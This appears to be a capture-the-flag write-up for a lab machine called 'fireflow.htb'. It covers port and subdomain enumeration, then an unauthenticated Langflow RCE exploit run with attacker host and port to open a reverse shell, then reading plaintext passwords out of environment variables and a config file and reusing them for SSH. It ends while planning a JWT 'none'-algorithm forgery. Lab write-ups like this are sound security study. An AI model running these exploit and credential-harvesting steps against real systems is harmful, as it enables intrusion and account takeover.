# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT 10.129.48.171
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 17:02 +0100
Nmap scan report for 10.129.48.171
Host is up (0.018s latency).
Not shown: 62762 closed tcp ports (conn-refused), 2771 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds
```

## Nmap
```python
nmap -p 22,443 -A --min-rate=2000 -sT 10.129.48.171  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 17:04 +0100
Nmap scan report for fireflow.htb (10.129.48.171)
Host is up (0.013s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
443/tcp open  ssl/http nginx
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nmap detects the domain `fireflow.htb`

# SSH (22)
## Auth method
```python
ssh root@fireflow.htb                   
The authenticity of host 'fireflow.htb (10.129.48.171)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'fireflow.htb' (ED25519) to the list of known hosts.
root@fireflow.htb's password:
```

Password based authentication

# HTTP (443)

## Subdomains
```python
ffuf -u https://fireflow.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.fireflow.htb' -ic -c -t 30 -fs 162

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://fireflow.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.fireflow.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 30
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 162
________________________________________________

flow                    [Status: 200, Size: 1142, Words: 132, Lines: 25, Duration: 32ms]
```

Found a subdomain

Feroxbuster found nothing on the main site

Nuclei also did not find anything on the main site

![1135](Pasted%20image%2020260822171555.png)

There is a link on the home page to what looks like an AI chatbot

This takes me to the subdomain

# `flow` subdomain

## Nuclei
```python
nuclei -u https://flow.fireflow.htb/

[CVE-2026-33017] [http] [critical] https://flow.fireflow.htb/api/v1/version
[waf-detect:nginxgeneric] [http] [info] https://flow.fireflow.htb/
[ssh-auth-methods] [javascript] [info] flow.fireflow.htb:22 ["["publickey","password"]"]
[ssh-password-auth] [javascript] [info] flow.fireflow.htb:22
[ssh-sha1-hmac-algo] [javascript] [info] flow.fireflow.htb:22
[ssh-server-enumeration] [javascript] [info] flow.fireflow.htb:22 ["SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.16"]
[tls-version] [ssl] [info] flow.fireflow.htb:443 ["tls12"]
[tls-version] [ssl] [info] flow.fireflow.htb:443 ["tls13"]
[weak-csp-detect:unsafe-default-src] [http] [info] https://flow.fireflow.htb/ ["default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: ws: wss:;"]
[missing-sri] [http] [info] https://flow.fireflow.htb/ ["https://fonts.googleapis.com/css2?family=Chivo:ital,wght@0,100..900;1,100..900&family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap"]
[langflow-detect] [http] [info] https://flow.fireflow.htb/api/v1/version ["1.8.2"]
[tech-detect:google-font-api] [http] [info] https://flow.fireflow.htb/
[tech-detect:nginx] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:permissions-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:x-frame-options] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] https://flow.fireflow.htb/
[http-missing-security-headers:strict-transport-security] [http] [info] https://flow.fireflow.htb/
[redoc-api-docs] [http] [info] https://flow.fireflow.htb/redoc
[openapi] [http] [info] https://flow.fireflow.htb/openapi.json
[ssl-issuer] [ssl] [info] flow.fireflow.htb:443 ["Task Force Nightfall"]
[self-signed-ssl] [ssl] [low] flow.fireflow.htb:443
[ssl-dns-names] [ssl] [info] flow.fireflow.htb:443 ["fireflow.htb","*.fireflow.htb"]
[wildcard-tls] [ssl] [info] flow.fireflow.htb:443 ["SAN: [fireflow.htb *.fireflow.htb]","CN: fireflow.htb"]
```

Found a critical CVE

```python
curl https://flow.fireflow.htb/api/v1/version -k
{"version":"1.8.2","main_version":"1.8.2","package":"Langflow"}
```

Curling the endpoint nuclei gave in the output also gave me the version of langflow

And after some research i see the CVE ID does line up with the version, it is an unauthenticated remote code execution exploit

# CVE-2026-33017

> Langflow is a Python framework for building large language model-backed (LLM) workflows as visual flow graphs. One of its API endpoints, POST `/api/v1/build_public_tmp`/{flow_id}`/flow`, accepts a JSON body containing a code field and evaluates that code as Python in the service’s own process context. The endpoint is unauthenticated. It exists to allow users to prototype flows without logging in. What it actually does, in any instance exposed to the public internet, is handing a full, server-side code execution to anyone who sends a POST.

https://github.com/langflow-ai/langflow/security/advisories/GHSA-vwmf-pq79-vjvx

However after some research i basically need to make a request to the `auto_logon` API endpoint to retrieve a super user token

```python
curl -s -k https://flow.fireflow.htb/api/v1/auto_login                        
{"detail":{"message":"Auto login is disabled.","auto_login":false}}
```

In this instance `auto_logon` is disabled, so therefor i need to find a flow ID of an existing flow

This can still work it just means i cant generate my own flow ID, i need to find an existing one if there is one

After some research i see the flow_id is passed in the request

![](Pasted%20image%2020260822180110.png)

So when im on the chatbot, ill open dev tools network tab, then type something into the prompt, then grab this request and read the path

Ive identified a public flow_id to be:

```python
7d84d636-af65-42e4-ac38-26e867052c25
```

This is also reflected in the URL of the chatbot

https://github.com/EQSTLab/CVE-2026-33017

Ive found a POC

```python
penelope -p 1337
```

Ill start a listener

On the first attempt, this attack fails, and reviewing the code i see its not handling HTTPS

![](Pasted%20image%2020260822181512.png)

To fix this ill add a simple line to the `send_payload()` function

```python
python3 exploit.py --url https://flow.fireflow.htb/ --flow-id '7d84d636-af65-42e4-ac38-26e867052c25' --lhost 10.10.14.61 --lport 1337
[*] Target: https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow?event_delivery=direct&log_builds=false
[*] Callback: 10.10.14.61:1337
/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1110: InsecureRequestWarning: Unverified HTTPS request is being made to host 'flow.fireflow.htb'. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings
  warnings.warn(
```

```python
penelope -p 1337
[+] Listening for reverse shells on 0.0.0.0:1337 -> 127.0.0.1 • 192.168.86.128 • 10.10.14.61
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => fireflow 10.129.48.171 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] Upgrading shell to PTY...
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/kali/.penelope/sessions/fireflow~10.129.48.171-Linux-x86_64/2026_08_22-18_15_44-799.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@fireflow:/var/lib/langflow$ whoami
www-data
www-data@fireflow:/var/lib/langflow$
```

I now have a shell on the system

# Enumeration as `www-data`

```python
www-data@fireflow:/var/lib/langflow$ ls -la /home
total 12
drwxr-xr-x  3 root      root      4096 May 12 15:28 .
drwxr-xr-x 23 root      root      4096 May 12 15:28 ..
drwxr-x---  5 nightfall nightfall 4096 May 12 15:28 nightfall
www-data@fireflow:/var/lib/langflow$ 
```

There is one user on the system!

```python
www-data@fireflow:/var/lib/langflow$ env
LANGFLOW_LOG_LEVEL=warning
SHELL=/usr/bin/bash
USER_AGENT=langflow
MEMORY_PRESSURE_WRITE=c29tZSAyMDAwMDAgMjAwMDAwMAA=
SERVER_SOFTWARE=gunicorn/22.0.0
LANGFLOW_NEW_USER_IS_ACTIVE=False
PWD=/var/lib/langflow
LOGNAME=www-data
LANGFLOW_SUPERUSER=langflow
SYSTEMD_EXEC_PID=1507
LANGFLOW_CONFIG_DIR=/var/lib/langflow
HOME=/var/www
LANG=en_US.UTF-8
MEMORY_PRESSURE_WATCH=/sys/fs/cgroup/system.slice/langflow.service/memory.pressure
INVOCATION_ID=b36394c51ffb472eb8325b72775841ad
TERM=xterm-256color
USER=www-data
LANGFLOW_AUTO_LOGIN=False
SHLVL=2
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
JOURNAL_STREAM=8:9199
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/snap/bin
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
_=/usr/bin/env
OLDPWD=/var/lib/langflow/ba4fe756-d6f7-4c7a-a7b1-f986206878ec
www-data@fireflow:/var/lib/langflow$
```

There is a password stored in the environment variable

```python
n1ghtm4r3_b4_n1ghtf4ll
```

Ill first try this on the nightfall user

# SSH access as `nightfall`

```python
ssh nightfall@fireflow.htb
nightfall@fireflow.htb's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-111-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat Aug 22 05:20:54 PM UTC 2026

  System load:           0.01
  Usage of /:            84.9% of 15.58GB
  Memory usage:          50%
  Swap usage:            0%
  Processes:             245
  Users logged in:       0
  IPv4 address for eth0: 10.129.48.171
  IPv6 address for eth0: dead:beef::a0de:adff:feb4:c902

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

2 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
nightfall@fireflow:~$
```

Using the pasword stored in the environment variable, i get SSH access

# Enumeration as `nightfall`

```python
nightfall@fireflow:~/.mcp$ cat config.json 
{
  "server": "http://10.129.48.171:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
nightfall@fireflow:~/.mcp$
```

Found another password!

Looks like there is an MCP server running

![](Pasted%20image%2020260822184150.png)

Critically, it looks like it supports `none` algorithm, which means i might be able to forge a JWT for the application without a signature

First of all to make this easier i can forward this service to my machine, using an SSH tunnel

```python

```